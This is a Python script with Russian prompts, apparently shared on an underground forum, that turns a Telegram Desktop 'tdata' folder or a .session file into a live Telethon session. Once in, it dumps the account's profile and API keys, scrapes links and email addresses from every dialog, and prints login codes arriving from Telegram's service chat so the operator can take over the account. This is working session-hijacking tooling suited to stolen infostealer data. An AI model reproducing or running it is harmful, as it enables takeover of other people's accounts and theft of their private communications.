# -*- coding: utf-8 -*-
import asyncio
import codecs
import json
import os
import re
import sys
from datetime import datetime as dt

import easygui
from colorama import Fore, init
from opentele.api import UseCurrentSession
from telethon import events,TelegramClient
from opentele.td import TDesktop
from tqdm import tqdm

init()
C = Fore
os.system('cls')
bb  = f'''
             ████████╗████████╗ ██████╗ ████████╗
             ╚══██╔══╝╚══██╔══╝██╔═══██╗╚══██╔══╝
                ██║      ██║   ██║   ██║   ██║   
                ██║      ██║   ██║   ██║   ██║   
                ██║      ██║   ╚██████╔╝   ██║   
                ╚═╝      ╚═╝    ╚═════╝    ╚═╝      
{C.LIGHTBLACK_EX}Telegram Desktop convert to Telethon Session by https://lolz.guru/members/2977610/                        
'''
print(C.MAGENTA+bb)
async def save_dialogs(id,client):
    if not os.path.exists(id+'/dialogs'):os.mkdir(id+'/dialogs')
    dialogs = {'dialogID': {'name': 'chatName','countMessage': 999,'countLinks':999,'countMails': 999}}
    links = {'dialogID': ['links','links','links']}
    mails = {'dialogID': ['mails','mails']}
    dialogs_get = await client.get_dialogs()
    for index,di in tqdm(enumerate(dialogs_get), desc ="Получение диалогов",unit='диалог',ascii='█'):
        messages = await client.get_messages(di)
        link = [i[0].replace('\n','') for i in re.findall(r'((http|https|tg|ftp|scp|sftp|ssh|rdp|pgsql|smtp|mysqli|redis|amqp)://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+)',str(messages))]
        mail = [i[0].replace('\n','') for i in re.findall(r"(^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$)",str(messages))]
        if link:links[str(index)] = link
        if mail: mails[str(index)] = mail
        dialogs[str(index)] ={'name': di.name,'countMessage': len(messages),'countLinks': len(link),'countMails':len(mail)}
    if dialogs != {'dialogID': {'name': 'chatName','countMessage': 999,'countLinks':999,'countMails': 999}}:print(json.dumps(dialogs,indent=4,ensure_ascii=False),file=codecs.open(id+'/dialogs/dialogs.json','w','utf8'))
    if links != {'dialogID': ['links','links','links']}: print(json.dumps(links,indent=4,ensure_ascii=False),file=codecs.open(id+'/dialogs/links.json','w','utf8'))
    if mails != {'dialogID': ['mails','mails']}: print(json.dumps(mails,indent=4,ensure_ascii=False),file=codecs.open(id+'/dialogs/mails.json','w','utf8'))
async def get_sms(phone,client):
    print(C.GREEN+'Войдите в телеграм с помощью номера:',C.MAGENTA+phone)
    @client.on(events.NewMessage(chats=(777000)))
    async def normal_handler(event):
        print(C.RESET+event.message.to_dict()['message'])
    await client.run_until_disconnected()

async def main(tdataFolder,type):

    if type:
        try:tdesk = TDesktop(tdataFolder);assert tdesk.isLoaded()
        except:raise Exception('"tdata" no valid')
        id_user = str(tdesk.mainAccount.UserId)
        session = id_user+'/'+id_user+"-ttot.session"
        if not os.path.exists(id_user):os.mkdir(id_user)
        client = await tdesk.ToTelethon(session=session, flag=UseCurrentSession)   
        await client.connect()
    else:
        session = tdataFolder
        if '.session' not in session[8:]:raise Exception('.session no valid')
        api_id = 8
        api_hash  = 'e313131313131'
        client = TelegramClient(session, api_id,api_hash)   
        await client.start(phone=lambda: input(C.BLUE+'Введите номер телефона для получения смс в тг: '+C.MAGENTA),code_callback=lambda: input(C.BLUE+'Введите отправленный код: '+C.MAGENTA),password=lambda x: input(C.BLUE+'Введите код 2fa: '+C.MAGENTA))
    user = await client.get_me()
    userInfo = user.to_dict()
    id_user = str(userInfo['id'])
    if not os.path.exists(id_user):os.mkdir(id_user)
    open(id_user+'/'+id_user+"-ttot.session",'wb').write(open(tdataFolder,'rb').read())
    del userInfo['photo']
    userInfo['status']['was_online'] = dt.strftime(userInfo['status']['was_online'],'%y-%m-%d %H:%M:%S')
    userInfo['api_id'] = client.api_id
    userInfo['api_hash'] = client.api_hash
    await client.download_profile_photo('me',id_user+'/user_photo.jpg', download_big=True)
    print(json.dumps(userInfo,indent=4,ensure_ascii=False),file=codecs.open(id_user+'/user.json','w','utf8'))
    di = str(len(await client.get_dialogs()))
    if input(C.GREEN+f'Найдено {di} диалогов.\nХотите сохранить? (Y-да;другое-нет): '+C.BLUE).lower() == 'y':await save_dialogs(id_user,client)
    if input(C.GREEN+f'Хотите получить смс чтобы войти через обычный телеграмм? (После получения нажмите ctrl+c) (Y-да;другое-нет): '+C.BLUE).lower() == 'y':await get_sms(userInfo['phone'],client)
    print(C.GREEN+'Результат в папке - '+C.MAGENTA+ id_user)
    await client.disconnect()

   
try:
    type = input(f'{C.BLUE}Выберите тип работы: {C.MAGENTA} (1-конвертация, 2-зайти по .session){C.RED}: ')
    if type == '1':
        path  = easygui.diropenbox(msg='Укажите папку с "tdata"',title='TDeskop to TData')
        asyncio.run(main(path,True))
    elif type == '2':
        path  = easygui.fileopenbox(msg='Выберите файл .session',title='TDeskop to TData')
        asyncio.run(main(path,False))
    else:
        print(C.RED+"Я еще не зна такой тип.")
except KeyboardInterrupt:sys.exit(0)
except Exception as e:print(C.RED+str(e))
try:input(C.LIGHTBLACK_EX+'Press enter to exit.')
except KeyboardInterrupt:sys.exit(0)
